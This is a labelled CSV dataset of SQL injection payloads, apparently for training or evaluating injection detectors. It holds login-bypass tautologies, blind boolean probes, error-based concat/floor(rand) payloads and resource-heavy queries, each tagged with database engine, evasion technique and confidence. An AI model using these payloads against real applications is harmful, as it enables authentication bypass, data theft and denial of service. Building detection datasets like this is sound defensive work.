payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"select * from users where id = 1 or ""%&"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
select * from users where id = '1' <@&@ or 1 = 1 -- 1',boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""%{"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""@ ( "" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""@ ) "" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""@;"" = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""@?"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""@#"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""@%"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""{ ( "" = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""{ ) "" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""{,"" = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""{."" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""{1"" = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""{;"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""{?"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""{#"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or @#""{ = 1 or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""{%"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""{@"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ""{{"" or 1 = 1 -- 1",boolean_blind,unknown,case_variation,0.7,rule,sqliv5_csv,unknown
' ) or ( 'x' ) = ( 'x,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
or 1 = 1#,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
or 1 = 1/*,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
admin' or '1' = '1'--,boolean_blind,unknown,,0.7,rule,sqliv5_csv,string_single_quote
admin' or '1' = '1'#,boolean_blind,unknown,,0.7,rule,sqliv5_csv,string_single_quote
admin' or '1' = '1'/*,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
admin'or 1 = 1 or '' = ',boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
admin' or 1 = 1,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
admin' or 1 = 1--,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
admin' or 1 = 1#,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
admin' or 1 = 1/*,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
admin' ) or ( '1' = '1,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
admin' ) or ( '1' = '1'--,boolean_blind,unknown,,0.8,rule,sqliv5_csv,string_single_quote
admin' ) or ( '1' = '1'#,boolean_blind,unknown,,0.8,rule,sqliv5_csv,string_single_quote
admin' ) or ( '1' = '1'/*,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
admin' ) or '1' = '1'--,boolean_blind,unknown,,0.8,rule,sqliv5_csv,string_single_quote
admin' ) or '1' = '1'#,boolean_blind,unknown,,0.8,rule,sqliv5_csv,string_single_quote
admin' ) or '1' = '1'/*,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
"admin""or 1 = 1 or """" = """,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
"admin"" or 1 = 1",boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
"admin"" or 1 = 1--",boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
"admin"" or 1 = 1#",boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
"admin"" or 1 = 1/*",boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
a' or 1 = 1--,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
"""a"""" or 1 = 1--""",boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
' or 1 = 1,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
‘ or 1 = 1 --,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
23 OR 1 = 1,boolean_blind,unknown,,0.8,rule,sqliv5_csv,numeric
' ) or ( 'x' = 'x,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
0 or 1 = 1,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
' or 0 = 0 --,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
""" or 0 = 0 --",boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
or 0 = 0 --,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
' or 0 = 0 #,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
"or 0 = 0 #""",boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
or 0 = 0 #,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
' or '1' = '1'--,boolean_blind,unknown,,0.7,rule,sqliv5_csv,string_single_quote
' or 1 = 1 or '' = ',boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
"or 1 = 1 or """" =",boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
"hi or 1 = 1 --""",boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
hi' or 1 = 1 --,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
hi' ) or ( 'a' = 'a,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
'hi' or 'x' = 'x';,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
x' or 1 = 1 or 'x' = 'y,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
a' or 3 = 3--,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
"""a"""" or 3 = 3--""",boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
' or 3 = 3,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
‘ or 3 = 3 --,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
) or ( 'x' = 'x,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
) or ( 'a' = 'a,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
or 3 = 3,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
or 1 = 1 or '' = ',boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
or 'unusual' = 'unusual',boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
hi' or 'x' = 'x';,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
â or 1 = 1 --,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
or 'something' = 'some'+'thing',boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
Ã½ or 1 = 1 --,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
â or 3 = 3 --,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
or '1' = '1'--,boolean_blind,unknown,,0.8,rule,sqliv5_csv,string_single_quote
 or 1 = 1 --,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
or 3 = 3 --,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
 or 3 = 3 --,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 ) as clye where 7842 = 7842 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
1 ) as boed where 6787 = 6787,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" where 4281 = 4281",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1%"" ) and 8024 = 3560--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'rawn' from dual where 4988 = 4988 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ) ||'",boolean_blind,oracle,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
-9534%' or 3038 = 3038,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) as ztkr where 1532 = 1532",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) as rbpx where 1264 = 1264,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-7868"" ) ) or 9323 = 9323#",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" where 2462 = 2462 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1%' and 4595 = 4595#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) as oknw where 8777 = 8777,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" where 6501 = 6501",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-7999 ) or 8422 = 1336,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-5742' where 1314 = 1314 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) and 2006 = 2006",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) where 4867 = 4867 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-2120' ) or 8734 = 8844#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) and 4595 = 4595#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'gboi' where 4191 = 4191 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) ||'",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) as paai where 4089 = 4089 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9281 ) where 8363 = 8363 or make_set ( 8220 = 5127,5127 ) --",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) where 6671 = 6671 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
-7562 ) or 8571 = 8571--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-3707"" ) ) ) or 8571 = 8571--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) where 2136 = 2136 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-8665' or 6825 = 7840 and 'vbsy' like 'vbsy,boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'bnaz' from dual where 7168 = 7168 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
"-7686%"" ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1' where 3612 = 3612 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) and 7533 = 7533 and ( ( ""%"" = """,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-3834' ) ) as hhiy where 2086 = 2086 or 3038 = 3038,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-4785"" ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as uaxn where 5657 = 5657 rlike ( select ( case when ( 3548 = 7206 ) then 1 else 0x28 end ) ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-4670"" ) ) or 3038 = 3038",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) where 2753 = 2753 and ( 2739 = 8047 ) *8047--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select 'ljtl' where 1766 = 1766,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-3921' ) as audo where 7087 = 7087 or 1755 = 4937--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-2072"" ) as rjcz where 2491 = 2491 or 6872 = 6872--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-7187' or 4159 = 7465,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1'+ ( select 'yzxc' where 5230 = 5230 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) +'",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
"1'+ ( select 'sbvh' where 8539 = 8539 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) +'",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'uiyj' from dual where 8320 = 8320,boolean_blind,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
"-9011"" ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'zyvk' from dual where 2072 = 2072,boolean_blind,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
-5918' ) as olzc where 5992 = 5992 or 4390 = 9085,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) where 7010 = 7010 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
1' and 5967 = 4184#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'cclo' from dual where 6823 = 6823 and 9198 = 9198--,boolean_blind,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) where 7199 = 7199 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1'+ ( select 'zohk' where 5502 = 5502 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' ) ) as eymg where 7000 = 7000,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 where 7051 = 7051 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) ) and 7533 = 7533 and ( ( ( ""%"" = """,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) and 9198 = 9198--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) where 6897 = 6897",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as osuh where 8809 = 8809",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'ftey' where 1363 = 1363 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||'",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
-5137 ) or 9323 = 9323#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) as gbtj where 8175 = 8175,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) as lisg where 5490 = 5490,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 where 3902 = 3902 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' where 8749 = 8749 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
-4892%' ) ) or 2251 = 9881--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-6233' ) where 9820 = 9820 or 3038 = 3038,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-8209 ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
1 ) ) as muyz where 6105 = 6105,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' and 1541 = 6868#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) where 1402 = 1402,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 where 9872 = 9872,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' ) where 7587 = 7587 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"-9135"" ) ) or 6872 = 6872 and ( ( ""fllx"" = ""fllx",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-9881"" ) ) or 9850 = 8118#",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-7859 ) as ipdg where 4413 = 4413 or 9323 = 9323#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) where 5774 = 5774,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-3081"" ) ) ) or 3736 = 1899",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as bbkl where 5686 = 5686",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select 'cwta' where 6091 = 6091,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-2298%' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-1808%"" ) ) or 4595 = 3545 and ( ( ""%"" = """,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) as bhdj where 4472 = 4472,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) ) as pgif where 6346 = 6346,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) as yekp where 3049 = 3049 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as mvxa where 3024 = 3024",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-6045 or 8919 = 2827--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as khqq where 3637 = 3637 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1 ) ) as ambt where 5198 = 5198 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,unknown,function_alternative,0.8,rule,sqliv2_csv,unknown
-7505' ) ) as lqvw where 8565 = 8565 or 6872 = 6872--,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) as qgsb where 7600 = 7600 and 2006 = 2006,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' where 4795 = 4795 and 4595 = 4595#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) as rnte where 6517 = 6517 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-2548"" ) ) ) or 5107 = 8049--",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) where 2834 = 2834 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",boolean_blind,unknown,case_variation|function_alternative,0.8,rule,sqliv2_csv,unknown
1' ) and 4595 = 4595#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" where 8727 = 8727",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'jpso' from dual where 9357 = 9357 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||'",boolean_blind,oracle,case_variation|hex_string,0.46,rule,sqliv2_csv,unknown
"1' ) as ywtu where 3009 = 3009 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'jmao' where 3009 = 3009,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) where 4698 = 4698 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'rfjl' where 2476 = 2476 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) ||'",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) where 9285 = 9285 and 8506 = 8343#",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'+ ( select wgmn where 4368 = 4368 and 7859 = 6151 ) +',boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-6200%' ) ) or 8077 = 4661,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1' ) as mvai where 5856 = 5856 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
1' ) as zxos where 2745 = 2745,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) ) as sfan where 7176 = 7176 and 7017 = 7358,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as rpxd where 4929 = 4929",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 ) ) as mlpf where 7425 = 7425,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-9336' or 5641 = 9488#,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'noik' from dual where 9851 = 9851,boolean_blind,oracle,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" where 7045 = 7045",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1 ) as wust where 3884 = 3884 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1' ) where 1363 = 1363,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) where 9861 = 9861",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1 where 3354 = 3354,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
-3096' or 3821 = 5539 and 'zrth' = 'zrth,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) as buky where 7898 = 7898 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1"" ) where 4567 = 4567 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",boolean_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
1 ) where 2232 = 2232,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1' ) as bihs where 4197 = 4197,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
1'|| ( select 'fwph' where 3791 = 3791,boolean_blind,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1 ) as oknr where 3228 = 3228,boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"1"" ) as gtpi where 8100 = 8100 and make_set ( 2678 = 9169,9169 ) --",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
"-6747"" or 9323 = 9323#",boolean_blind,unknown,,0.8,rule,sqliv2_csv,unknown
